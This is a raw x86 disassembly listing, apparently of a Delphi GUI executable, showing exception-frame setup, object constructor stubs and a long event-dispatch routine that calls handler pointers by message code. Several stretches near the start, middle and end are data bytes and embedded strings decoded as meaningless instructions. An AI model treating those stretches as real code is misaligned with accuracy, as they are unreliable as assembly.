add [ eax + esi * 2 ] al
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl dh
outsd
bound ebp [ edx + 0x65 ]
inc ebp
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
pop es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] al
add [ edi ] 0x0
or cl [ edi + 0x6e ]
push edx
jo r-xdata
dec edi
outsb
inc ebp
jb r-xdata
add [ edi ] al
in al 0x7c
inc edx
add al cl
stosd [ edi ]
inc ecx
add [ edx + ebp * 4 ] dh
inc edi
add al ah
add al [ edx ]
and al 0x4
inc edx
add [ eax + 0x74c0042 ] bl
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ esp + ebp * 4 ] dl
inc edi
add [ edi + edi * 2 + 0x48 ] dh
add al cl
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ edi + edi * 2 - 0x5353ffb8 ] ch
inc ecx
add [ ebx + eax ] bh
dec esi
outsd
inc esp
popad
je r-xdata
arpl [ eax + 0x6 ] si
push 0x65
outsd
push ebp
cld
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
lea eax [ ebx + 0x50 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
outsd
jb r-xdata
jb r-xdata
add [ esp + esi + 0x31ec0040 ] ah
inc eax
add [ eax ] cl
xor al [ eax ]
lodsb [ esi ]
jg r-xdata
inc eax
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
jb r-xdata
add [ edx ] al
or [ edi ] al
inc ecx
push ebx
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000a ] al
outsd
dec eax
add [ eax ] bh
add bh bh
js r-xdata
inc edi
add [ eax + eax ] cl
or [ ecx + 0x63 ] al
arpl [ ebp + 0x73 ] sp
pushfd
outsd
dec eax
add [ eax - 0x5a ] al
dec esi
outsd
inc esp
popad
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al [ eax ]
or [ edi + 0x6e ] cl
sub_4871a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a990
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4871e0
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47a9e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_487214
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a8#4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487277
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47abb4
lea eax [ ebx + 0x220 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a4c
sub_487282
rcl [ ecx ] cl
lea ebx [ edi ]
add [ eax + 0x4 ] dl
add [ ebx - 0x2774ac05 ] 0xffffff83
mov ebx 0x220
add [ eax + ebx - 0x75 ] dh
xchg ebx eax
and [ edx ] al
add [ eax ] al
mov eax ebx
call sub_47abd0
lea eax [ ebx + 0x220 ]
call sub_405a08
pop ebx
retn
sub_4872b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a990
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4872ec
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47a9e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_487314
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_487ebb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edx 0x86b
jg r-xdata
cmp edx 0x953
jg r-xdata
je r-xdata
add edx 0xfffff6ac
cmp edx 0xf
ja r-xdata
je r-xdata
cmp [ ebx + 0x12a ] 0x0
je r-xdata
cmp edx 0x80f
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487ec2
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
mov ecx 0xc
call sub_404a58
retn
jmp [ edx * 4 + jump_table_487541 ]
cmp [ ebx + 0x1aa ] 0x0
je r-xdata
cmp edx 0x945
jg r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x12c ]
call [ ebx + 0x128 ]
jmp r-xdata
cmp edx 0x817
jg r-xdata
je r-xdata
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
cmp [ ebx + 0x1ba ] 0x0
je r-xdata
cmp [ ebx + 0x1c2 ] 0x0
je r-xdata
cmp [ ebx + 0x1ca ] 0x0
je r-xdata
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
cmp [ ebx + 0x1da ] 0x0
je r-xdata
cmp [ ebx + 0x1e2 ] 0x0
je r-xdata
cmp [ ebx + 0x1ea ] 0x0
je r-xdata
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ ebx + 0x1fa ] 0x0
je r-xdata
cmp [ ebx + 0x202 ] 0x0
je r-xdata
cmp [ ebx + 0x20a ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x21a ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x1ac ]
call [ ebx + 0x1a8 ]
jmp r-xdata
add edx 0xfffff6ba
cmp edx 0xc
ja r-xdata
je r-xdata
cmp edx 0x823
jg r-xdata
je r-xdata
cmp [ ebx + 0x82 ] 0x0
je r-xdata
cmp edx 0xfffffda8
jg r-xdata
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ esi ]
add edx 0x10
call sub_4138ac
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ esi ]
add edx 0x10
call sub_4138ac
mov eax [ ebp - 0x8 ]
push eax
mov eax [ esi ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x1c4 ]
call [ ebx + 0x1c0 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ esi ]
add edx 0x10
call sub_4138ac
mov eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x1cc ]
call [ ebx + 0x1c8 ]
jmp r-xdata
mov eax [ esi ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ esi ]
add edx 0x10
call sub_4138ac
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
mov edx [ esi ]
call sub_4138ac
mov ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ esi ]
add edx 0x10
call sub_4138ac
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ esi ]
add edx 0x20
call sub_4138ac
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ esi ]
call sub_4138ac
mov ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
jmp r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ esi ]
add edx 0x10
call sub_4138ac
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x28 ]
mov edx [ esi ]
call sub_4138ac
mov ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov edx [ esi ]
call sub_4138ac
mov ecx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx [ esi ]
call sub_4138ac
mov ecx [ ebp - 0x30 ]
mov edx ebx
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
jmp r-xdata
mov eax [ esi ]
add eax 0x10
call sub_410180
push eax
mov eax [ esi ]
call sub_411588
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
jmp r-xdata
mov eax [ esi ]
call sub_410180
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x214 ]
call [ ebx + 0x210 ]
jmp r-xdata
mov eax [ esi ]
call sub_410180
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
jmp [ edx * 4 + jump_table_4874f7 ]
cmp [ ebx + 0x172 ] 0x0
je r-xdata
cmp edx 0x941
jg r-xdata
sub edx 0x824
je r-xdata
je r-xdata
cmp [ ebx + 0xba ] 0x0
je r-xdata
add edx 0xfffff7f0
cmp edx 0x6
ja r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
jmp r-xdata
cmp edx 0x80c
jg r-xdata
je r-xdata
cmp [ ebx + 0x17a ] 0x0
je r-xdata
cmp [ ebx + 0x182 ] 0x0
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
cmp [ ebx + 0x192 ] 0x0
je r-xdata
cmp [ ebx + 0x19a ] 0x0
je r-xdata
cmp [ ebx + 0x1a2 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x174 ]
call [ ebx + 0x170 ]
jmp r-xdata
sub edx 0x942
je r-xdata
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
sub edx 0x3d
je r-xdata
cmp [ ebx + 0x11a ] 0x0
je r-xdata
sub edx 0x818
je r-xdata
mov edx ebx
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
jmp r-xdata
jmp [ edx * 4 + jump_table_48740b ]
sub edx 0x80d
je r-xdata
je r-xdata
cmp [ ebx + 0xda ] 0x0
je r-xdata
add edx 0x25f
cmp edx 0x6
ja r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x18c ]
call [ ebx + 0x188 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x194 ]
call [ ebx + 0x190 ]
jmp r-xdata
mov eax [ esi ]
call sub_410180
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x19c ]
call [ ebx + 0x198 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x1a4 ]
call [ ebx + 0x1a0 ]
jmp r-xdata
cmp [ ebx + 0x15a ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x152 ] 0x0
je r-xdata
sub edx 0x86c
je r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
jmp r-xdata
cmp [ ebx + 0x142 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
jmp r-xdata
cmp [ ebx + 0xc2 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x92 ] 0x0
je r-xdata
cmp [ ebx + 0x9a ] 0x0
je r-xdata
cmp [ ebx + 0xa2 ] 0x0
je r-xdata
cmp [ ebx + 0xaa ] 0x0
je r-xdata
cmp [ ebx + 0xb2 ] 0x0
je r-xdata
cmp [ ebx + 0x72 ] 0x0
je r-xdata
dec edx
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
mov edx ebx
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
jmp r-xdata
jmp [ edx * 4 + jump_table_487384 ]
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x15c ]
call [ ebx + 0x158 ]
jmp r-xdata
cmp [ ebx + 0x162 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
jmp r-xdata
cmp [ ebx + 0x132 ] 0x0
je r-xdata
sub edx 0x31
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
jmp r-xdata
cmp [ ebx + 0xca ] 0x0
je r-xdata
dec edx
je r-xdata
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xac ]
call [ ebx + 0xa8 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
cmp [ ebx + 0x7a ] 0x0
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
sub edx 0x80b
je r-xdata
cmp [ ebx + 0xe2 ] 0x0
je r-xdata
cmp [ ebx + 0xea ] 0x0
je r-xdata
cmp [ ebx + 0xf2 ] 0x0
je r-xdata
cmp [ ebx + 0xfa ] 0x0
je r-xdata
cmp [ ebx + 0x102 ] 0x0
je r-xdata
cmp [ ebx + 0x10a ] 0x0
je r-xdata
cmp [ ebx + 0x112 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x164 ]
call [ ebx + 0x160 ]
jmp r-xdata
cmp [ ebx + 0x16a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x134 ]
call [ ebx + 0x130 ]
jmp r-xdata
cmp [ ebx + 0x13a ] 0x0
je r-xdata
sub edx 0x81
je r-xdata
mov edx ebx
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
jmp r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ esi ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x114 ]
call [ ebx + 0x110 ]
jmp r-xdata
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov ecx eax
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
jmp r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
sub_487ed4
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push j_sub_4039a8#3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x88 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_487f37
lea eax [ ebp - 0x4 ]
call sub_405a08
retn
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47abb4
lea eax [ ebx + 0x88 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_405a4c
sub_487f3e
mov eax [ 0xffffffffd3d37432 ]
adc [ ebp + 0x4500021 ] ecx
add [ ebx - 0x2774ac05 ] 0xffffff83
mov ebx 0x88
add [ eax + ebx - 0x75 ] dh
xchg ebx eax
mov [ eax ] al
add [ eax ] al
mov eax ebx
call sub_47abd0
lea eax [ ebx + 0x88 ]
call sub_405a08
pop ebx
retn
sub_487f74
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47a990
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_487fac
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_47a9e4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_487fd4
push ebx
cmp edx 0x818
jg r-xdata
sub edx 0x823
je r-xdata
je r-xdata
cmp [ eax + 0x72 ] 0x0
je r-xdata
sub edx 0x4e
je r-xdata
cmp [ eax + 0x6a ] 0x0
je r-xdata
sub edx 0xffffffff
je r-xdata
pop ebx
retn
mov edx [ ecx ]
mov edx [ edx + 0x18 ]
push edx
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
jmp r-xdata
cmp [ eax + 0x7a ] 0x0
je r-xdata
dec edx
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
jmp r-xdata
sub edx 0x813
je r-xdata
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
jmp r-xdata
cmp [ eax + 0x82 ] 0x0
je r-xdata
jmp r-xdata
cmp [ eax + 0x52 ] 0x0
je r-xdata
sub edx 0x4
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x84 ]
call [ ebx + 0x80 ]
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
jmp r-xdata
cmp [ eax + 0x5a ] 0x0
je r-xdata
dec edx
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
jmp r-xdata
cmp [ eax + 0x62 ] 0x0
je r-xdata
jmp r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
jmp r-xdata
sub_4880d4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4880f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_488100
retn
sub_488110
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
test [ eax ] cl
dec esp
or [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
or [ eax ] 0x54
add eax [ eax ]
add [ esi + eax ] dl
inc esi
add [ edi + eax ] dh
inc edx
add [ eax + 0x5c004634 ] ch
inc esi
add [ eax - 0x37ffbfcc ] dh
pop edx
inc esi
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add ah al
inc esi
add al dh
adc al [ ebp ]
xor al 0x3c
inc esi
add al cl
stosd [ edi ]
inc ecx
add [ eax + edi + 0x38c00046 ] al
inc esi
add ah cl
cmp [ esi ] eax
mov al [ 0x4c00449d ]
pop es
inc edx
add [ edx + eax * 2 + 0x46 ] al
add [ esp + eax ] ch
inc edx
add ah ah
jge r-xdata
mov al [ 0x42840044 ]
inc esi
add ah dh
retn 0x44
add [ ebx + esi ] bl
inc esi
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
xchg edx eax
inc esp
add [ eax + 0x24004508 ] al
aas
inc esi
add [ eax + 0x44004505 ] al
xchg edx eax
inc esp
add [ eax - 0x6e ] cl
inc esp
add [ eax ] bl
inc eax
inc esi
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ edx + eax * 2 ] cl
inc esi
add al bl
inc eax
inc esi
add [ eax + 0x44 ] cl
add [ edx + eax * 2 - 0x3d0bffba ] al
inc esp
add [ esi + eax ] cl
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ ecx + esi ] ah
inc esi
add [ eax ] ch
dec ecx
inc esi
add [ eax - 0x24 ] al
inc esp
add ah ch
push ebp
inc esi
add [ ecx + ebx * 2 + 0x46 ] cl
add [ eax ] cl
pop eax
inc esi
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x7c ]
pop edx
inc esi
add [ ebx + ebx * 8 ] bh
inc esp
add ah ch
pop es
inc ebp
add [ eax + 0x61 ] bh
inc esi
add al ah
sbb [ ebp ] eax
xor [ eax * 2 + 0x46768c00 ] al
add [ eax ] bl
sub eax [ esi ]
enter 0x462d 0x0
insb
inc esi
add [ eax + 0x24004637 ] ch
cmp [ esi ] al
insb
jpe r-xdata
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or [ ecx + ebp * 2 + 0x73 ] cl
je r-xdata
add al ah
xor al 0x46
add [ eax + 0x75 ] dh
inc esi
add [ eax + 0x5c ] dl
inc esi
add [ edi + esi * 2 ] ah
inc esi
add [ eax ] cl
inc edx
inc esi
add [ edi ] dl
add bh ch
or [ eax ] 0xfffffff8
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc edi
jb r-xdata
add [ eax ] cl
outsd
dec esp
popad
bound esp [ ebp + 0x6c ]
jne r-xdata
js r-xdata
imul esp [ ebx + 0x61 ] 0x6e6f6974
inc ebp
jbe r-xdata
add [ eax ] al
pop es
add [ esi ] al
or [ ebx ] al
add [ eax ] al
add al 0x0
or [ ebx + 0x68 ] eax
arpl [ gs : ebx + 0x42 ] bp
outsd
js r-xdata
xor [ eax ] ebx
add eax [ eax ]
insb
inc edx
outsd
js r-xdata
outsb
cmp [ ebx ] al
add [ eax ] al
adc [ eax ] al
or al 0x50
jb r-xdata
add eax [ eax ]
add [ eax ] dl
add [ eax + edx * 2 ] cl
outsb
je r-xdata
add [ 0x74696445 ] al
xor [ ebx + eax ] ebx
add [ eax ] al
or [ eax ] eax
adc al [ ecx + 0x70 ]
jo r-xdata
or al 0x3
add [ eax ] al
add eax 0x75420700
je r-xdata
js r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ ebx ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30031
add [ edx ] al
add [ ebx ] cl
push edx
popad
inc ebx
add [ eax - 0x6b ] dl
inc esp
imul esp [ ecx + 0x6c ] 0x4831676f
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
outsb
je r-xdata
xor [ ebx + eax ] edi
add [ eax ] al
adc [ eax ] eax
push cs
xor [ eax ] esp
add eax [ eax ]
add [ edx ] cl
add [ ecx ] cl
push ebx
jo r-xdata
xor [ ebx + eax ] ebp
outsd
outsb
xor [ eax ] edx
add eax [ eax ]
add [ esi ] al
add [ edx ] cl
push eax
outsd
jo r-xdata
xor [ eax ] dh
inc ebp
inc eax
inc edx
inc edx
push esp
pushad
xchg edx eax
mov ebp 0x2d2d2dbd
cmp [ edx - 0x4e ] al
cmp bl bh
jmp 0xfffffffffe79429d
xor [ eax - 0x7f ] ebx
dec eax
add [ edi + eax + 0x46 ] bl
add [ esi ] bl
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
test ebx ebx
je r-xdata
add [ eax + 0x32 ] dh
inc ebx
add [ eax ] bl
out dx al
inc ebx
add al cl
fild [ ebx ]
or bl dl
jo r-xdata
dec eax
add [ esp + 0x408d0048 ] cl
add [ esp + eax * 4 + 0x48 ] dl
add [ edi ] al
push ebp
dec eax
add [ eax + 0x6f ] dl
push edx
adc al [ ecx + 0x63 ]
arpl [ ebp + 0x73 ] sp
jae r-xdata
xor [ bx + si + 0x3 ] ecx
push edx
jo r-xdata
imul esp [ ecx + 0x6c ] 0x3c31676f
add eax [ eax ]
jae r-xdata
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x4031676f
add eax [ eax ]
add [ edx ] dl
add [ edx ] dl
dec edi
jo r-xdata
add [ ecx ] dl
add [ esi ] cl
